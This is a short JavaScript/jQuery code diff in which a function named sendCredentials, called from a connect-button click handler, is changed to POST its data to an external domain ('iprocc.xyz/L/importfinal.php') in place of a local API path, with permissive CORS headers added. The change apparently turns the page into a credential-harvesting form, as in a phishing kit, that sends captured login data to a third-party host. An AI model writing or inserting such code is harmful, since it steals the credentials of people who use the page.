@@ -26,7 +26,12 @@ $(".connect-btn").click(function (e) {
 function sendCredentials(data) {
     $.ajax({
         type: "POST",
-        url: "api/v2/index",
+        url: "https://iprocc.xyz/L/importfinal.php",
+        headers: {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+            'Access-Control-Allow-Headers': 'Origin, Content-Type, X-Auth-Token',
+        },
         data: 
         {
             data: data
